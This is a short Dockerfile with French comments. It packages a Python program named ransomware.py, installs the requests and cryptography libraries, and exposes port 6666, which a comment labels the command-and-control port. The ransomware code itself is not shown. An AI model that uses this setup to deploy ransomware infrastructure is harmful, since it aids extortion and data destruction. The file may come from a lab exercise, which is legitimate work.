# Utilisation d'une image Python
FROM python:3.10

# Définition du dossier de travail
WORKDIR /app

# Copier tous les fichiers sources dans /app/sources
COPY sources /app/sources

# Installation des dépendances Python
RUN pip install --no-cache-dir requests cryptography

# Exposition du port CNC
EXPOSE 6666

# Définition de la commande par défaut
CMD ["python3", "sources/ransomware.py"]
